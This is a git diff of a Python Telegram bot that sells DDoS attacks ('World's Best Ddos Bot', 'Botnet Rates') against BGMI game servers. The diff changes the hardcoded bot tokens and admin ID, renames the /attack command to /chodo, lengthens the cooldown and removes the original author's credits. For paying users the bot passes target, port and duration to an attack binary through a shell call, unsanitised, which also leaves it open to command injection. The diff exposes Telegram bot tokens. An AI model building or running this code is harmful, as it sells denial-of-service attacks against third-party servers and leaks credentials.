@@ -11,10 +11,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7272842335:AAFLwtA-8R_Vww7WJnRBsqmmWSwQjINVfL4')
+bot = telebot.TeleBot('7180678400:AAEZQcDp-PhL8-bV7MlC7lZP9v4ePy6wiMU')
 
 # Admin user IDs
-admin_id = ["1713986516"]
+admin_id = ["6187533649"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -211,16 +211,16 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n✨✨Premium \nAttack 𝐒𝐓𝐀𝐑𝐓ING ACTION WITH PROXY.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\nBy NiTZEX @SAYYED_Z"
+    response = f"{username}, \n✨✨Premium \nAttack 𝐒𝐓𝐀𝐑𝐓ING ACTION WITH PROXY.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /attack1 command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =30
+COOLDOWN_TIME =120
 
 # Handler for /attack1 command
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['chodo'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -228,7 +228,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown. Please Wait 30 sec Before Running The /attack Command Again buy premium instant attack with zero sec NiTZEX."
+                response = "You Are On Cooldown. Please Wait 120 sec Before Running The /chodo Command Again buy premium instant attack with zero sec"
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -247,11 +247,11 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./RAGNAROK {target} {port} {time} CRACKS"
                 subprocess.run(full_command, shell=True)
-                response = f"✨✨Premium \nAttack Finished In This Proxy. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n NiTZEX @SAYYED_Z"
+                response = f"✨✨Premium \nAttack Finished In This Proxy. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} "
         else:
-            response = "Usage :- /attack <target> <port> <time>\nBy NiTZEX @SAYYED_Z"  # Updated command syntax
+            response = "Usage :- /chodo <target> <port> <time>\nBy NiTZEX @SAYYED_Z"  # Updated command syntax
     else:
-        response = "You Are Not ✨✨Premium User's To Authorized To Use This Command.\nBy NiTZEX DM TO GET ACCESS @SAYYED_Z"
+        response = "You Are Not ✨✨Premium User's To Authorized To Use This Command."
 
     bot.reply_to(message, response)
 
@@ -281,7 +281,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
- /attack : Method For Bgmi Servers. 
+ /chodo : Method For Bgmi Servers. 
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
  /plan : Checkout Our Botnet Rates.
@@ -303,7 +303,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy NiTZEX @SAYYED_Z"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot"
     bot.reply_to(message, response)
 
 
@@ -315,7 +315,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By NiTZEX'''
+'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
